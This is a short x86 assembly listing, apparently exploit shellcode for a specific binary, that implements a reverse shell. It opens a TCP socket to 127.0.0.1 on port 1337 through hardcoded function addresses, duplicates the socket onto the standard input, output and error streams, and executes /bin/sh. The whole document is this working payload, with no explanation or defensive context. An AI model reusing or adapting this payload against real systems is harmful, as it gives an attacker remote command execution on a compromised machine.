sub esp,1024
mov ebp,esp
sub ebp,1024
mov word ptr [ebp-28],2
mov dword ptr [esp],0x539
mov esi,0x08048620
//htons
call esi
mov [ebp-26],ax
//0x0100007f (127.0.0.1)
mov dword ptr[ebp-24],0x100007f
mov dword ptr[esp+8],0
mov dword ptr[esp+4], 1
mov dword ptr[esp], 2
//socket
mov esi,0x08048710
call esi
mov [ebp-32], eax
mov dword ptr[esp+8],0x10
lea eax, [ebp-28]
mov [esp+4], eax
mov eax, [ebp-32]
mov [esp], eax
//connect
mov esi,0x08048730
call esi
mov dword ptr[esp+4],0
mov eax, [ebp-32]
mov [esp], eax
//dup2
mov esi,0x080485e0
call esi
mov dword ptr[esp+4],1
mov eax, [ebp-32]
mov [esp], eax
//dup2
mov esi,0x080485e0
call esi
mov dword ptr[esp+4],2
mov eax, [ebp-32]
mov [esp],eax
//dup2
mov esi,0x080485e0
call esi
mov dword ptr[esp+4],0
jmp _get_bin_bash
_got_bin_bash:
pop ebx
xor ecx,ecx
mov [ebx+7],cl
mov [esp],ebx
//execv
mov esi,0x080486b0
call esi
_get_bin_bash:
call _got_bin_bash
.string "/bin/sh"
